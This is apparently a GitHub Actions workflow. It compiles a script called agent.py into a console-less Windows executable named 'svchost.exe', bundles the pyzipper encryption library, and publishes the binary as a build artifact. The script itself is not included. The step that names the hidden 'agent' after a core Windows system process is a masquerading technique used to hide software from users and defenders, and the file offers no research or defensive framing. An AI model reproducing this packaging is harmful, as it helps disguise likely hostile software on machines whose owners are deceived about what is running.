name: build
on:
  push:
  workflow_dispatch:
jobs:
  win:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      - run: pip install pyinstaller pyzipper
      - run: pyinstaller --onefile --noconsole --name svchost --hidden-import pyzipper agent.py
      - uses: actions/upload-artifact@v4
        with:
          name: agent
          path: dist/svchost.exe